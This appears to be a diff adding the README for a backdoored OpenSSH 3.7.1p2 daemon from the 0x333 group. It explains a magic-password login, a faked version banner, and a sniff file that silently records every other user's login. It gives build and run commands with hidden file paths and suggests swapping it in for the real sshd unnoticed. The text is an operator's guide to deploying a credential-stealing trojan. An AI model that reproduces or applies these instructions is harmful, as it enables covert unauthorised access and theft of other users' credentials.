@@ -1,0 +1,65 @@
+-----------------------------------------------------------------------------------------------------------------------------
+openssh-3.7.1p2 backdoor by nsn.
+credits djoser.
+-----------------------------------------------------------------------------------------------------------------------------
+
+This backdoor works in two modes, like a trojan and like a standard DAEMON.
+
+in trojan mode you have to specify two options (if you don't specify these, works in NO TROJAN MODE):
+
+ -n file    path Configuration file
+ -s file    path Sniff output log file
+
+format of configuration file have to be this:
+
+hashMD5 (magic password)
+openSSH fake version
+
+e.g:
+
+bda6faa04180e97ef40aaeab44a1fee1
+SSH-1.99-OpenSSH_3.5p2
+
+first line is a hash of key "nsn" in MD5, second line a fake version of DAEMON.
+in this package will be incluse 0x333MD5hash-linux.c that generate password for you.
+
+if you don't specify a version, by default is getted version openssh-3.7.1p2.
+
+In sniff file will be logged all access except access with magic password, this can be nice, if you replace true sshd, 
+with this trojan and log all access of others users, and more you can fake version of old sshd, so nothing should be 
+changed.
+
+-----------------------------------------------------------------------------------------------------------------------------
+
+compiling:
+
+-----------------------------------------------------------------------------------------------------------------------------
+cd src
+./configure --prefix=yourbackdir
+make
+make install
+-----------------------------------------------------------------------------------------------------------------------------
+
+when run daemon:
+
+./sshd -p port -n conf -s sniff file
+
+e.g:
+
+./sshd -p 25000 -n /usr/src/.info/.cnf -s /usr/src/.info/.sh.pw
+
+note: use complete path for configuration file and sniff file
+
+backdoored sshd doesn't use defaults path, for -n and -s, is a your job touch it and generate it correctly. 
+* warning: when backdoor load conf, check that banner is getted good, else kill deamon and fix file conf.
+
+
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------
+www.0x333.org
+outsiders.
+-----------------------------------------------------------------------------------------------------------------------------
+
